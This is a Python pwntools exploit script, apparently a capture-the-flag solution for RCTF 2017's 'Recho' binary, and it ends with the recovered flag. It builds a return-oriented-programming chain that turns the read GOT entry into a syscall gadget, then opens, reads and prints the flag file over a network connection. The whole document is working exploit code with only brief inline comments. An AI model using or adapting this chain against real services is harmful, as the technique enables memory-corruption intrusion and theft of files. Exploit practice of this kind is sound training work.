#!/usr/bin/env python2

from pwn import *
from socket import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

b = ELF('Recho')
context.log_level = 'info'
RDI = 0x00000000004008a3 #: pop rdi ; ret
RSI = 0x00000000004008a1 #: pop rsi ; pop r15 ; ret
RDX = 0x00000000004006fe #: pop rdx ; ret
RAX = 0x00000000004006fc #: pop rax ; ret

###

if DEBUG:
    r = remote('localhost', 4242)
else:
    r = remote('recho.2017.teamrois.cn', 9527)

r.recvuntil('server!\n')
r.sendline('2000')
time.sleep(0.5)

# first part of ROP is incrementing b.got['read'] by 0xe so we have a syscall gadget
ROP  = '\x00' * 0x30
ROP += p64(0xdeadbeef) # rbp - bogus
ROP += p64(RDI)
ROP += p64(b.got['read'])
ROP += p64(RAX)
ROP += p64(0xe)
ROP += p64(0x000000000040070c) # : xchg eax, ebx ; add byte ptr [rdi], al ; ret
ROP += p64(0x000000000040070c) # : xchg eax, ebx ; add byte ptr [rdi], al ; ret
# now read is just a syscall, we open('flag', 0)
ROP += p64(RDI)
ROP += p64(b.symbols['flag'])
ROP += p64(RAX)
ROP += p64(2) # syscall open
ROP += p64(RSI)
ROP += p64(0)
ROP += p64(0)
ROP += p64(RDX)
ROP += p64(0)
ROP += p64(b.symbols['read']) # syscall
# now reading flag with read syscall
ROP += p64(RDI)
ROP += p64(3) # fd of opened flag
ROP += p64(RSI)
ROP += p64(b.bss() + 0x200) # we write the flag inside BSS
ROP += p64(0xdeadbeef) # bogus value - r15
ROP += p64(RDX)
ROP += p64(0x50) # size of read
ROP += p64(RAX)
ROP += p64(0) # read syscall
ROP += p64(b.symbols['read']) # syscall
# now writing flag to stdout
ROP += p64(RDI)
ROP += p64(1) # stdout
ROP += p64(RAX)
ROP += p64(1) # write syscall
ROP += p64(b.symbols['read'])

log.info('len(ROP): %d' % len(ROP))
r.sendline(ROP)

# this part trigger the exit of the main loop and our ROP is executed
r.sock.shutdown(SHUT_WR)

# getting flag
d = r.recvall()
flag = ''
for x in d:
    if x != '\x00':
        flag += x
print flag.rstrip()

r.close()

# RCTF{l0st_1n_th3_3ch0_d6794b}
